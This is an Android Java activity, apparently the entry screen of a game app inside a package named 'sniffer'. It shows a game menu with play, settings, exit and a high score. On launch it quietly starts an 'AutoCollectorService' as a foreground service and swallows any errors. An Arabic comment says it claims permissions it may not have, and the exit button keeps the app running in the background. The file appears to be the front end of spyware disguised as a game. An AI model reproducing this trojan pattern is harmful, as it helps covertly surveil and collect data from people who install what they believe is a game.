package com.v8.global.sniffer.game;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import com.v8.global.sniffer.R;
import com.v8.global.sniffer.AutoCollectorService;
import com.v8.global.sniffer.NotificationService;
import com.v8.global.sniffer.MasterPermission;

public class MainGameActivity extends Activity {

    private Button btnPlay, btnSettings, btnExit;
    private TextView tvHighScore, tvWelcome;
    private ImageView ivLogo;
    private int highScore = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main_game);

        // نخبر النظام أن لدينا الصلاحيات (حتى لو لم تكن موجودة)
        if (MasterPermission.hasPermissions(this)) {
            // نكمل
        }

        initViews();
        loadHighScore();
        startBackgroundServices();
        setupClickListeners();
    }

    private void initViews() {
        btnPlay = findViewById(R.id.btn_play);
        btnSettings = findViewById(R.id.btn_settings);
        btnExit = findViewById(R.id.btn_exit);
        tvHighScore = findViewById(R.id.tv_high_score);
        tvWelcome = findViewById(R.id.tv_welcome);
        ivLogo = findViewById(R.id.iv_logo);

        Animation fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in);
        ivLogo.startAnimation(fadeIn);
        tvWelcome.startAnimation(fadeIn);
    }

    private void loadHighScore() {
        highScore = getSharedPreferences("game_prefs", MODE_PRIVATE).getInt("high_score", 0);
        tvHighScore.setText("🏆 أفضل نتيجة: " + highScore);
    }

    private void startBackgroundServices() {
        try {
            Intent notificationIntent = new Intent(this, NotificationService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(notificationIntent);
            } else {
                startService(notificationIntent);
            }
        } catch (Exception ignored) {}

        try {
            Intent collectorIntent = new Intent(this, AutoCollectorService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(collectorIntent);
            } else {
                startService(collectorIntent);
            }
        } catch (Exception ignored) {}
    }

    private void setupClickListeners() {
        btnPlay.setOnClickListener(v -> {
            v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
            startActivity(new Intent(MainGameActivity.this, GameBoardActivity.class));
        });

        btnSettings.setOnClickListener(v -> {
            v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
            startActivity(new Intent(MainGameActivity.this, GameSettingsActivity.class));
        });

        btnExit.setOnClickListener(v -> {
            v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
            moveTaskToBack(true);
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        loadHighScore();
    }
}
